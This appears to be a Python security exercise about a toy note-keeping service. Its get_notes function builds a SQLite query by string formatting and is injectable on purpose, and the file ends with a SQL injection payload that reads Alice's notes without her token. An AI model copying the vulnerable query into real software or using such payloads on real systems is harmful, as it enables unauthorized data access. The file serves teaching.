"""
The note-my-note.com website offers registered users a service for keeping private notes. The code in the following codeboard is what
the website uses to let its logged-in users query a database for their private notes.
Here's its notes table with some rows for example:
notes
id	username	token	text
1	alice	token-a	Reminder: buy milk
2	alice	token-a	I like Bob
3	bob	token-b	TODO: write tests
After a user has logged in, she gets a secret token, which she then uses in her queries to obtain notes that belong to her.

Earlier today, Alice used it like so:

>>> get_notes('alice', ' token-a')
['Reminder: 'buy milk', 'I like Bob']
But if Malory tries to query the database, without knowing Alice's secret token, she won't be able to fetch those notes.

Can you obtain Alice's notes without knowing her token?
Implement an exploit using an SQL injection
"""
# don't change code up to line 40, the database is populated for your own testing

import sqlite3
import os

if os.path.exists('db.sqlite3'):
    os.remove('db.sqlite3')

with sqlite3.connect('db.sqlite3') as connection:
    cursor = connection.cursor()
    cursor.executescript('''
CREATE TABLE notes (
    id INTEGER PRIMARY KEY,
    username TEXT,
    token TEXT,
    text TEXT
);
INSERT INTO notes (username, token, text) VALUES ('alice', 'token-a', 'Reminder: buy milk');
INSERT INTO notes (username, token, text) VALUES ('alice', 'token-a', 'I like Bob');
INSERT INTO notes (username, token, text) VALUES ('bob', 'token-b', 'TODO: write tests');
    ''')

cache = {} # just a cache to avoid overloading the database


def get_notes(username, token):
    if username in cache:
        return cache[username]
    with sqlite3.connect('db.sqlite3') as connection:
        cursor = connection.cursor()
        cursor.execute('''
            SELECT text
              FROM notes
             WHERE token = '%s'
        ''' % token)
        cache[username] = user_notes = cursor.fetchall()
        return user_notes

# earlier today: get_notes('alice', 'token-a')
# start changing from here!

def hack_alice():
    return get_notes('alice',"password' or username = 'alice' -- ")
     # return alice's note without using her token
